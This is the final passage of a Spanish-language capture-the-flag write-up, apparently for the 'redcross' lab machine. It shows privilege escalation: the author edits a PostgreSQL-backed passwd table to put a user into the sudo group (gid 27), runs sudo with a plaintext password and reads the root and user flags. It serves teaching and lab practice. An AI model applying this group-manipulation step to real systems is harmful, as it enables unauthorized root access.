Esto significa que cualquier que pertenezca al grupo sudo, [podrá](https://www.hostinger.com/tutorials/sudo-and-the-sudoers-file/) subir a root. Ahora solo falta verificar cual es el grupo de sudo:

``` text
miau@redcross:~$ cat /etc/group | grep sudo
cat /etc/group | grep sudo
sudo:x:27:
```

Ahora si, cambiemos el grupo en la shell conectada a postgre:

``` text
update passwd_table set gid=27 where username='miau';
select * from passwd_table;
 username |               passwd               | uid  | gid  | gecos |    homedir     |   shell
----------+------------------------------------+------+------+-------+----------------+-----------
 tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail/home | /bin/bash
 miau     | $1$aINCdBU3$DI6tECMqjpMZ.D5c/DkpM/ | 2020 |   27 |       | /var/jail/home | /bin/bash
(2 rows)
```

Ahora que nuestro usuario `miau` pertenece al grupo sudo, elevemos a nuestro usuario:

``` text
miau@redcross:~$ sudo -s
sudo -s

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for miau: CCutRKf7

root@redcross:/var/jail/home#
```

# cat user.txt root.txt

Finalmente, como root desde miau, podemos tomar las flags:

``` text
root@redcross:/var/jail/home# cat /root/root.txt /home/penelope/user.txt
```

... We got root and user flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
